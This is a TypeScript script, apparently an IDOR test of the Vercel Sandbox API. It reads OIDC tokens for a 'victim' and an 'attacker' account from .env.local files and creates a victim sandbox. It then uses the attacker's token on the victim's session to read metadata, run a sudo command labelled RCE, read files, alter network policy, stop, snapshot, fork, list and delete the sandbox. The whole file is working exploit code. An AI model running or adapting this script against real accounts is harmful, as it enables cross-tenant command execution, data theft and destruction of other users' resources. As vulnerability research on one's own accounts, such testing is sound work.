import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";

function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}

const VICTIM_ENV = loadEnv("/tmp/vercel-sandbox/victima/.env.local");
const ATTACKER_ENV = loadEnv("/tmp/vercel-sandbox/.env.local");
const VICTIM = VICTIM_ENV.VERCEL_OIDC_TOKEN!;
const ATTACKER = ATTACKER_ENV.VERCEL_OIDC_TOKEN!;
const BASE = "https://vercel.com/api";

function claimsOf(t: string): any {
  try {
    return JSON.parse(Buffer.from(t.split(".")[1], "base64url").toString());
  } catch {
    return {};
  }
}
const V = claimsOf(VICTIM);
const A = claimsOf(ATTACKER);

async function call(
  label: string,
  token: string,
  method: string,
  path: string,
  query: Record<string, string> = {},
  body?: any,
) {
  const url = new URL(BASE + path);
  for (const [k, v] of Object.entries(query)) if (v) url.searchParams.set(k, v);
  const r = await fetch(url, {
    method,
    headers: {
      authorization: `Bearer ${token}`,
      "content-type": "application/json",
      "user-agent": "idor-test/0.1",
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  const text = await r.text();
  const safe = text.length > 600 ? text.slice(0, 600) + "…" : text;
  console.log(
    `\n[${r.status}] ${label}\n  ${method} ${url.pathname}${url.search}`,
  );
  console.log("  " + safe);
  return r.status;
}

async function main() {
  console.log("VÍCTIMA  :", V.owner_id, "/", V.project_id);
  console.log("ATACANTE:", A.owner_id, "/", A.project_id);

  const victim = await Sandbox.create({
    token: VICTIM,
    teamId: V.owner_id,
    projectId: V.project_id,
    resources: { vcpus: 1 },
    name: "victim-target",
    timeout: 5 * 60_000,
  });
  const vsess: any = (victim as any).session;
  const vsid = vsess?.sessionId;
  const vname = victim.name;
  const vteam = V.owner_id;
  const vproj = V.project_id;
  console.log(`\nVÍCTIMA creada: session=${vsid} name=${vname}`);

  // A) lectura
  await call("A: GET session víctima SIN teamId", ATTACKER, "GET", `/v2/sandboxes/sessions/${vsid}`);
  await call("A: GET session víctima CON teamId de víctima", ATTACKER, "GET", `/v2/sandboxes/sessions/${vsid}`, { teamId: vteam });
  await call("A: GET sandbox víctima por nombre", ATTACKER, "GET", `/v2/sandboxes/${vname}`, { projectId: vproj, teamId: vteam });

  // B) acciones
  await call("A: cmd en session víctima (RCE)", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/cmd`, { teamId: vteam }, { command: "id", args: [], env: {}, sudo: true });
  await call("A: fs/read en session víctima", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/fs/read`, { teamId: vteam }, { path: "/vercel" });
  await call("A: network-policy víctima", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/network-policy`, { teamId: vteam }, "deny-all");
  await call("A: stop víctima (DoS)", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/stop`, { teamId: vteam });
  await call("A: snapshot víctima", ATTACKER, "POST", `/v2/sandboxes/sessions/${vsid}/snapshot`, { teamId: vteam });

  // C) fork
  await call("A: fork sandbox víctima", ATTACKER, "POST", `/v2/sandboxes/${vname}/fork?projectId=${vproj}`, { teamId: vteam }, { name: "attacker-clone" });

  // D) listados
  await call("A: listar sessions del project víctima", ATTACKER, "GET", `/v2/sandboxes/sessions`, { project: vproj, teamId: vteam, limit: "5" });
  await call("A: listar snapshots del project víctima", ATTACKER, "GET", `/v2/sandboxes/snapshots`, { project: vproj, teamId: vteam, limit: "5" });

  // E) DELETE
  await call("A: DELETE sandbox víctima", ATTACKER, "DELETE", `/v2/sandboxes/${vname}`, { projectId: vproj, teamId: vteam });

  console.log("\nDONE");
}

main().catch((e) => {
  console.error("ERR", e.message);
  process.exit(1);
});